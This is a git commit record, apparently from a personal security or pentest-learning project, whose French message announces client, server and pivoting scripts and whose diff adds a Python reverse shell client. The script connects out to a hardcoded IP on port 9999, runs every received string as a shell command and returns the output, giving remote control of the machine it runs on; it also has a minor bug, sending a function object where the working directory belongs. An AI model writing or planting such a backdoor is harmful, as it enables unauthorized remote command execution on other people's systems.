1d70a30bd00c98870db0d6d7648db9a82e2b06b4
pauldereep <dereeper.paul@icloud.com>
2024-11-22 12:41:44 +0100

    Ajout de client.py - server.py - pivoting.py avec client et server fonctionnels

---
+++ client.py
@@ -0,0 +1,29 @@
+import socket 
+import os
+import subprocess
+
+
+host = '10.4.160.62' # change that to the IP address of the server
+port = 9999 
+s = socket.socket()
+
+s.connect((host, port))
+
+
+while True:
+    data = s.recv(1024) #1024 is the buffer size
+
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+            
+    if len(data) > 0: 
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # get trough the standard input, output and error
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte, "utf-8")
+        s.send(str.encode(output_str + str(os.getcwd) + '> '))
+
+        print (output_str) # print the output of the command on the client machine
+
+
+# if we get out of the loop, we close the connection
+s.close()
